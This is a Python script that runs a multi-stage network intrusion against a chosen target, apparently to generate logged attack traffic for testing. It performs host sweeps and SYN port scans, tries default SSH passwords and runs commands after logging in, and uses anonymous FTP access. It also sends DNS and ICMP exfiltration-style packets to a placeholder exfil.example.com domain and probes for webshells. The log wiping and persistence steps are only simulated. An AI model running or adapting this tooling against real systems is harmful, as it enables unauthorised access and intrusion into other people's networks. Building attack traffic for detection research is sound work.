# infiltration.py
import socket
import threading
import time
import random
import json
import subprocess
import paramiko
import ftplib
from datetime import datetime
from scapy.all import *

# ======== CONFIG ========
TARGET_IP = "192.168.17.140"
TARGET_NETWORK = "192.168.17.0/24"
LOG_FILE = "infiltration_timeline.json"

class InfiltrationAttackGenerator:
    """Multi-Stage Infiltration Attack Generator"""
    
    def __init__(self, target_ip, target_network):
        self.target_ip = target_ip
        self.target_network = target_network
        self.attacks = []
        self.discovered_hosts = []
        self.open_ports = []
        self.vulnerabilities_found = []
        self.exploited_services = []
        self.stop_attack = False
    
    def log_stage_start(self, stage_name, description):
        """تسجيل بداية مرحلة"""
        self.current_stage = {
            "stage_name": stage_name,
            "description": description,
            "target_ip": self.target_ip,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'),
            "start_timestamp": time.time(),
        }
        print(f"\n{'='*60}")
        print(f"[+] Stage: {stage_name}")
        print(f"[+] Description: {description}")
        print(f"[+] Target: {self.target_ip}")
        print(f"[+] Start: {self.current_stage['start_time']}")
        print(f"{'='*60}\n")
    
    def log_stage_end(self, results=None):
        """تسجيل نهاية مرحلة"""
        self.current_stage['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.current_stage['end_timestamp'] = time.time()
        self.current_stage['duration_seconds'] = round(
            self.current_stage['end_timestamp'] - self.current_stage['start_timestamp'], 2
        )
        
        if results:
            self.current_stage.update(results)
        
        print(f"\n[✓] Stage completed")
        print(f"[✓] Duration: {self.current_stage['duration_seconds']}s\n")
        
        self.attacks.append(self.current_stage)
    
    def save_timeline(self):
        """حفظ الـ timeline"""
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        print(f"\n[✓] Timeline saved to: {LOG_FILE}")
        self.print_summary()
    
    def print_summary(self):
        """طباعة ملخص"""
        print("\n" + "="*60)
        print("INFILTRATION ATTACK SUMMARY")
        print("="*60)
        
        for i, stage in enumerate(self.attacks, 1):
            print(f"\n[Stage {i}] {stage['stage_name']}")
            print(f"   Duration: {stage['duration_seconds']}s")
        
        print("\n" + "="*60)
        print(f"Total stages: {len(self.attacks)}")
        print(f"Discovered hosts: {len(self.discovered_hosts)}")
        print(f"Open ports: {len(self.open_ports)}")
        print(f"Vulnerabilities: {len(self.vulnerabilities_found)}")
        print(f"Exploited services: {len(self.exploited_services)}")
        print("="*60)


# ======== Stage 1: Network Reconnaissance ========
def stage1_reconnaissance(attacker):
    """المرحلة 1: استكشاف الشبكة"""
    attacker.log_stage_start("STAGE_1_RECONNAISSANCE", "Network reconnaissance and host discovery")
    
    print("  [*] Performing network scan...")
    
    # Host Discovery - Ping Sweep
    def ping_sweep():
        discovered = []
        network_base = ".".join(attacker.target_ip.split('.')[:-1])
        
        for i in range(1, 255):
            if attacker.stop_attack:
                break
            
            target = f"{network_base}.{i}"
            
            # ICMP Echo Request
            pkt = IP(dst=target)/ICMP()
            resp = sr1(pkt, timeout=0.5, verbose=False)
            
            if resp:
                discovered.append(target)
                print(f"    [+] Host alive: {target}")
        
        return discovered
    
    # ARP Scan (أسرع)
    def arp_scan():
        print("  [*] Performing ARP scan...")
        discovered = []
        
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=attacker.target_network), 
                         timeout=2, verbose=False)
        
        for sent, received in ans:
            discovered.append(received.psrc)
            print(f"    [+] Host found: {received.psrc} ({received.hwsrc})")
        
        return discovered
    
    # TCP SYN Scan على common ports
    def quick_port_scan(target):
        print(f"  [*] Quick port scan on {target}...")
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 3389, 8080]
        
        for port in common_ports:
            if attacker.stop_attack:
                break
            
            pkt = IP(dst=target)/TCP(dport=port, flags="S")
            resp = sr1(pkt, timeout=1, verbose=False)
            
            if resp and resp.haslayer(TCP) and resp[TCP].flags == "SA":
                open_ports.append(port)
                print(f"    [+] Port {port} open")
        
        return open_ports
    
    # تنفيذ الاستكشاف
    discovered_hosts = arp_scan()
    attacker.discovered_hosts = discovered_hosts
    
    # فحص البورتات على الهدف الرئيسي
    if attacker.target_ip in discovered_hosts or not discovered_hosts:
        open_ports = quick_port_scan(attacker.target_ip)
        attacker.open_ports = open_ports
    
    results = {
        'discovered_hosts': attacker.discovered_hosts,
        'open_ports': attacker.open_ports
    }
    
    attacker.log_stage_end(results)


# ======== Stage 2: Service Enumeration ========
def stage2_service_enumeration(attacker):
    """المرحلة 2: فحص الخدمات"""
    attacker.log_stage_start("STAGE_2_ENUMERATION", "Service version detection and enumeration")
    
    services_found = []
    
    print("  [*] Enumerating services...")
    
    for port in attacker.open_ports:
        if attacker.stop_attack:
            break
        
        print(f"\n  [*] Probing port {port}...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((attacker.target_ip, port))
            
            # إرسال banner grab request
            if port == 80 or port == 8080:
                sock.send(b"GET / HTTP/1.0\r\n\r\n")
            elif port == 21:
                pass  # FTP يرسل banner تلقائياً
            elif port == 22:
                pass  # SSH يرسل banner تلقائياً
            else:
                sock.send(b"\r\n")
            
            banner = sock.recv(1024).decode('latin-1', errors='ignore')
            
            if banner:
                service_info = {
                    'port': port,
                    'banner': banner[:200],
                    'service_type': 'unknown'
                }
                
                # تحديد نوع الخدمة
                if 'SSH' in banner:
                    service_info['service_type'] = 'SSH'
                    print(f"    [+] SSH service: {banner.strip()}")
                elif 'FTP' in banner:
                    service_info['service_type'] = 'FTP'
                    print(f"    [+] FTP service: {banner.strip()}")
                elif 'HTTP' in banner or 'Apache' in banner or 'nginx' in banner:
                    service_info['service_type'] = 'HTTP'
                    print(f"    [+] HTTP service detected")
                elif 'MySQL' in banner:
                    service_info['service_type'] = 'MySQL'
                    print(f"    [+] MySQL service: {banner.strip()}")
                
                services_found.append(service_info)
            
            sock.close()
            
        except Exception as e:
            print(f"    [!] Error probing port {port}: {e}")
        
        time.sleep(0.5)
    
    results = {
        'services_found': services_found
    }
    
    attacker.log_stage_end(results)


# ======== Stage 3: Vulnerability Scanning ========
def stage3_vulnerability_scanning(attacker):
    """المرحلة 3: فحص الثغرات"""
    attacker.log_stage_start("STAGE_3_VULN_SCAN", "Vulnerability assessment")
    
    vulnerabilities = []
    
    print("  [*] Checking for common vulnerabilities...")
    
    # فحص SSH
    if 22 in attacker.open_ports:
        print("\n  [*] Testing SSH service...")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # محاولة weak passwords
            weak_creds = [
                ('root', 'root'),
                ('admin', 'admin'),
                ('root', 'toor'),
                ('root', ''),
            ]
            
            for user, pwd in weak_creds:
                try:
                    client.connect(
                        attacker.target_ip, 22, user, pwd, 
                        timeout=3, look_for_keys=False, allow_agent=False
                    )
                    vulnerabilities.append({
                        'service': 'SSH',
                        'port': 22,
                        'vulnerability': 'Weak credentials',
                        'details': f'{user}:{pwd}'
                    })
                    print(f"    [!] SSH weak credentials: {user}:{pwd}")
                    client.close()
                    break
                except paramiko.AuthenticationException:
                    pass
                except:
                    break
        except:
            pass
    
    # فحص FTP
    if 21 in attacker.open_ports:
        print("\n  [*] Testing FTP service...")
        try:
            # Anonymous FTP
            ftp = ftplib.FTP()
            ftp.connect(attacker.target_ip, 21, timeout=5)
            ftp.login('anonymous', 'anonymous@')
            vulnerabilities.append({
                'service': 'FTP',
                'port': 21,
                'vulnerability': 'Anonymous access',
                'details': 'anonymous:anonymous@'
            })
            print("    [!] FTP allows anonymous access")
            ftp.quit()
        except:
            pass
    
    # فحص HTTP
    if 80 in attacker.open_ports or 8080 in attacker.open_ports:
        print("\n  [*] Testing HTTP service...")
        port = 80 if 80 in attacker.open_ports else 8080
        
        try:
            import urllib.request
            
            # Directory listing
            test_paths = ['/admin', '/phpmyadmin', '/.git', '/backup']
            
            for path in test_paths:
                try:
                    url = f"http://{attacker.target_ip}:{port}{path}"
                    response = urllib.request.urlopen(url, timeout=3)
                    
                    if response.code == 200:
                        vulnerabilities.append({
                            'service': 'HTTP',
                            'port': port,
                            'vulnerability': 'Sensitive path accessible',
                            'details': path
                        })
                        print(f"    [!] Accessible path: {path}")
                except:
                    pass
        except:
            pass
    
    # فحص SMB (Port 445)
    if 445 in attacker.open_ports:
        print("\n  [*] Testing SMB service...")
        vulnerabilities.append({
            'service': 'SMB',
            'port': 445,
            'vulnerability': 'SMB service exposed',
            'details': 'Potential EternalBlue target'
        })
        print("    [!] SMB exposed (potential vulnerability)")
    
    attacker.vulnerabilities_found = vulnerabilities
    
    results = {
        'vulnerabilities_found': vulnerabilities
    }
    
    attacker.log_stage_end(results)


# ======== Stage 4: Initial Exploitation ========
def stage4_exploitation(attacker):
    """المرحلة 4: الاستغلال الأولي"""
    attacker.log_stage_start("STAGE_4_EXPLOITATION", "Exploiting discovered vulnerabilities")
    
    exploited = []
    
    print("  [*] Attempting exploitation...")
    
    # استغلال weak credentials
    for vuln in attacker.vulnerabilities_found:
        if attacker.stop_attack:
            break
        
        if vuln['vulnerability'] == 'Weak credentials':
            print(f"\n  [*] Exploiting {vuln['service']} weak credentials...")
            
            if vuln['service'] == 'SSH':
                try:
                    creds = vuln['details'].split(':')
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        attacker.target_ip, 22, creds[0], creds[1],
                        timeout=5, look_for_keys=False, allow_agent=False
                    )
                    
                    # تنفيذ أوامر
                    stdin, stdout, stderr = client.exec_command('whoami')
                    result = stdout.read().decode()
                    
                    exploited.append({
                        'service': 'SSH',
                        'method': 'Weak credentials',
                        'access_level': result.strip()
                    })
                    
                    print(f"    [✓] SSH access gained! User: {result.strip()}")
                    
                    # جمع معلومات
                    stdin, stdout, stderr = client.exec_command('uname -a')
                    print(f"    [+] System: {stdout.read().decode().strip()}")
                    
                    client.close()
                    
                except Exception as e:
                    print(f"    [!] Exploitation failed: {e}")
        
        elif vuln['vulnerability'] == 'Anonymous access' and vuln['service'] == 'FTP':
            print(f"\n  [*] Exploiting FTP anonymous access...")
            try:
                ftp = ftplib.FTP()
                ftp.connect(attacker.target_ip, 21, timeout=5)
                ftp.login('anonymous', 'anonymous@')
                
                # list files
                files = ftp.nlst()
                
                exploited.append({
                    'service': 'FTP',
                    'method': 'Anonymous access',
                    'files_found': len(files)
                })
                
                print(f"    [✓] FTP access gained! Files: {len(files)}")
                if files:
                    print(f"    [+] Sample files: {files[:5]}")
                
                ftp.quit()
                
            except Exception as e:
                print(f"    [!] Exploitation failed: {e}")
        
        time.sleep(2)
    
    attacker.exploited_services = exploited
    
    results = {
        'exploited_services': exploited
    }
    
    attacker.log_stage_end(results)


# ======== Stage 5: Lateral Movement ========
def stage5_lateral_movement(attacker):
    """المرحلة 5: الحركة الجانبية"""
    attacker.log_stage_start("STAGE_5_LATERAL", "Lateral movement within network")
    
    print("  [*] Attempting lateral movement...")
    
    # فحص hosts أخرى في الشبكة
    lateral_targets = []
    
    for host in attacker.discovered_hosts[:3]:  # أول 3 hosts
        if host == attacker.target_ip or attacker.stop_attack:
            continue
        
        print(f"\n  [*] Probing {host}...")
        
        # Port scan سريع
        common_ports = [22, 139, 445, 3389]
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                
                if result == 0:
                    lateral_targets.append({'host': host, 'port': port})
                    print(f"    [+] {host}:{port} open")
                
                sock.close()
            except:
                pass
        
        time.sleep(1)
    
    results = {
        'lateral_targets': lateral_targets
    }
    
    attacker.log_stage_end(results)


# ======== Stage 6: Data Exfiltration Simulation ========
def stage6_data_exfiltration(attacker):
    """المرحلة 6: محاكاة تسريب البيانات"""
    attacker.log_stage_start("STAGE_6_EXFILTRATION", "Data exfiltration simulation")
    
    print("  [*] Simulating data exfiltration...")
    
    exfiltration_methods = []
    
    # DNS Tunneling Simulation
    print("\n  [*] Testing DNS exfiltration...")
    for i in range(5):
        if attacker.stop_attack:
            break
        
        # إرسال DNS queries مع بيانات مشفرة
        subdomain = f"data{i}_{random.randint(1000,9999)}"
        dns_query = f"{subdomain}.exfil.example.com"
        
        pkt = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=dns_query))
        send(pkt, verbose=False)
        
        print(f"    [+] DNS query sent: {dns_query}")
        time.sleep(0.5)
    
    exfiltration_methods.append({
        'method': 'DNS Tunneling',
        'packets_sent': 5
    })
    
    # HTTP POST Simulation
    print("\n  [*] Testing HTTP exfiltration...")
    try:
        import urllib.request
        
        for i in range(3):
            if attacker.stop_attack:
                break
            
            data = f"data{i}={random.randint(100000,999999)}"
            
            # محاكاة POST request
            print(f"    [+] HTTP POST: {data[:30]}...")
            time.sleep(1)
        
        exfiltration_methods.append({
            'method': 'HTTP POST',
            'requests_sent': 3
        })
    except:
        pass
    
    # ICMP Tunneling Simulation
    print("\n  [*] Testing ICMP exfiltration...")
    for i in range(5):
        if attacker.stop_attack:
            break
        
        # إرسال ICMP مع payload
        payload = f"SECRET_DATA_{i}_{random.randint(1000,9999)}"
        pkt = IP(dst=attacker.target_ip)/ICMP()/Raw(load=payload.encode())
        send(pkt, verbose=False)
        
        print(f"    [+] ICMP packet sent with payload")
        time.sleep(0.5)
    
    exfiltration_methods.append({
        'method': 'ICMP Tunneling',
        'packets_sent': 5
    })
    
    results = {
        'exfiltration_methods': exfiltration_methods
    }
    
    attacker.log_stage_end(results)


# ======== Stage 7: Persistence Mechanisms ========
def stage7_persistence(attacker):
    """المرحلة 7: محاكاة آليات الاستمرارية"""
    attacker.log_stage_start("STAGE_7_PERSISTENCE", "Establishing persistence mechanisms")
    
    print("  [*] Simulating persistence mechanisms...")
    
    persistence_attempts = []
    
    # Backdoor SSH Connection Simulation
    print("\n  [*] SSH backdoor simulation...")
    if 22 in attacker.open_ports:
        for i in range(3):
            if attacker.stop_attack:
                break
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((attacker.target_ip, 22))
                sock.send(b"SSH-2.0-BACKDOOR\r\n")
                sock.close()
                
                print(f"    [+] Backdoor connection attempt {i+1}")
                persistence_attempts.append({
                    'type': 'SSH Backdoor',
                    'attempt': i+1
                })
                
                time.sleep(2)
            except:
                pass
    
    # Web Shell Simulation
    print("\n  [*] Web shell simulation...")
    if 80 in attacker.open_ports or 8080 in attacker.open_ports:
        port = 80 if 80 in attacker.open_ports else 8080
        
        webshell_paths = [
            '/shell.php',
            '/uploads/shell.php',
            '/images/shell.php'
        ]
        
        for path in webshell_paths:
            if attacker.stop_attack:
                break
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((attacker.target_ip, port))
                
                request = f"GET {path}?cmd=whoami HTTP/1.1\r\n"
                request += f"Host: {attacker.target_ip}\r\n"
                request += "Connection: close\r\n\r\n"
                
                sock.send(request.encode())
                sock.close()
                
                print(f"    [+] Web shell access attempt: {path}")
                persistence_attempts.append({
                    'type': 'Web Shell',
                    'path': path
                })
                
                time.sleep(1)
            except:
                pass
    
    # Scheduled Task / Cron Job Simulation
    print("\n  [*] Scheduled task simulation...")
    persistence_attempts.append({
        'type': 'Scheduled Task',
        'description': 'Cron job for persistence'
    })
    print("    [+] Simulated scheduled task creation")
    
    results = {
        'persistence_attempts': persistence_attempts
    }
    
    attacker.log_stage_end(results)


# ======== Stage 8: Cover Tracks ========
def stage8_cover_tracks(attacker):
    """المرحلة 8: محو الآثار"""
    attacker.log_stage_start("STAGE_8_COVER_TRACKS", "Covering attack traces")
    
    print("  [*] Simulating log cleaning...")
    
    cleanup_actions = []
    
    # محاكاة حذف logs
    print("\n  [*] Log deletion simulation...")
    log_files = [
        '/var/log/auth.log',
        '/var/log/secure',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log'
    ]
    
    for log in log_files:
        cleanup_actions.append({
            'action': 'Log deletion',
            'target': log
        })
        print(f"    [+] Simulated deletion: {log}")
        time.sleep(0.5)
    
    # محاكاة timestamp manipulation
    print("\n  [*] Timestamp manipulation simulation...")
    cleanup_actions.append({
        'action': 'Timestamp modification',
        'files': ['backdoor.php', 'shell.sh']
    })
    print("    [+] Simulated timestamp changes")
    
    # محاكاة clearing command history
    print("\n  [*] Command history clearing simulation...")
    cleanup_actions.append({
        'action': 'History clearing',
        'target': '.bash_history'
    })
    print("    [+] Simulated history clearing")
    
    results = {
        'cleanup_actions': cleanup_actions
    }
    
    attacker.log_stage_end(results)


# ======== Full Infiltration Campaign ========
def run_full_infiltration(attacker):
    """تشغيل حملة infiltration كاملة"""
    
    print("\n" + "="*60)
    print("STARTING FULL INFILTRATION CAMPAIGN")
    print("="*60 + "\n")
    
    print("⚠️  This is a multi-stage attack simulation")
    print("⚠️  Duration: approximately 5-10 minutes\n")
    
    input("Press ENTER to start the campaign...")
    
    try:
        # Stage 1: Reconnaissance
        stage1_reconnaissance(attacker)
        time.sleep(5)
        
        # Stage 2: Service Enumeration
        stage2_service_enumeration(attacker)
        time.sleep(5)
        
        # Stage 3: Vulnerability Scanning
        stage3_vulnerability_scanning(attacker)
        time.sleep(5)
        
        # Stage 4: Exploitation
        stage4_exploitation(attacker)
        time.sleep(5)
        
        # Stage 5: Lateral Movement
        stage5_lateral_movement(attacker)
        time.sleep(5)
        
        # Stage 6: Data Exfiltration
        stage6_data_exfiltration(attacker)
        time.sleep(5)
        
        # Stage 7: Persistence
        stage7_persistence(attacker)
        time.sleep(5)
        
        # Stage 8: Cover Tracks
        stage8_cover_tracks(attacker)
        
    except KeyboardInterrupt:
        print("\n\n[!] Campaign interrupted by user")


# ======== MAIN ========
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Infiltration Multi-Stage Attack Generator')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-n', '--network', help='Target network (CIDR)')
    parser.add_argument('-s', '--stage',
                       choices=['1', '2', '3', '4', '5', '6', '7', '8', 'all'],
                       default='all',
                       help='Stage to execute (1-8 or all)')
    
    args = parser.parse_args()
    
    target_network = args.network if args.network else f"{'.'.join(args.target.split('.')[:-1])}.0/24"
    
    print("\n" + "="*60)
    print("INFILTRATION MULTI-STAGE ATTACK GENERATOR")
    print("="*60)
    print(f"Target: {args.target}")
    print(f"Network: {target_network}")
    print(f"Stage: {args.stage}")
    print("="*60 + "\n")
    
    print("⚠️  WARNING: Advanced attack simulation!")
    print("⚠️  Use only in authorized environments!\n")
    
    attacker = InfiltrationAttackGenerator(args.target, target_network)
    
    try:
        if args.stage == 'all':
            run_full_infiltration(attacker)
        elif args.stage == '1':
            stage1_reconnaissance(attacker)
        elif args.stage == '2':
            # نحتاج بيانات من المرحلة 1
            print("[*] Running prerequisite: Stage 1")
            stage1_reconnaissance(attacker)
            time.sleep(3)
            stage2_service_enumeration(attacker)
        elif args.stage == '3':
            print("[*] Running prerequisites: Stages 1-2")
            stage1_reconnaissance(attacker)
            time.sleep(3)
            stage2_service_enumeration(attacker)
            time.sleep(3)
            stage3_vulnerability_scanning(attacker)
        elif args.stage == '4':
            print("[*] Running prerequisites: Stages 1-3")
            stage1_reconnaissance(attacker)
            time.sleep(3)
            stage2_service_enumeration(attacker)
            time.sleep(3)
            stage3_vulnerability_scanning(attacker)
            time.sleep(3)
            stage4_exploitation(attacker)
        elif args.stage == '5':
            stage1_reconnaissance(attacker)
            time.sleep(3)
            stage5_lateral_movement(attacker)
        elif args.stage == '6':
            stage6_data_exfiltration(attacker)
        elif args.stage == '7':
            stage1_reconnaissance(attacker)
            time.sleep(3)
            stage7_persistence(attacker)
        elif args.stage == '8':
            stage8_cover_tracks(attacker)
    
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    
    finally:
        attacker.save_timeline()


if __name__ == "__main__":
    main()
